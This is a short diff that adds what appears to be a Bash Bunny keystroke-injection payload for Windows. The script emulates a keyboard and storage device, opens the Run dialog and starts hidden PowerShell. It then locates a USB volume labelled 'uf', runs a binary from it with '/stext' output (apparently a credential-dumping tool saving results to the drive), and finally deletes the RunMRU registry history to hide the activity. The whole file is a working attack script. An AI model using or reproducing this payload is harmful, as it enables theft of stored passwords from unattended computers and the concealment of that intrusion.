@@ -1,0 +1,8 @@
+LED R 100
+ATTACKMODE HID STORAGE
+QUACK DELAY 1000
+QUACK GUI r
+QUACK DELAY 75
+QUACK STRING "powershell -windowstyle hidden "'$D'" =Get-WMIObject Win32_Volume | ? { "'$_.Label'" -eq 'uf' } | select name;cd "'$D.name'";./s /stext p;Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+QUACK ENTER
+LED G
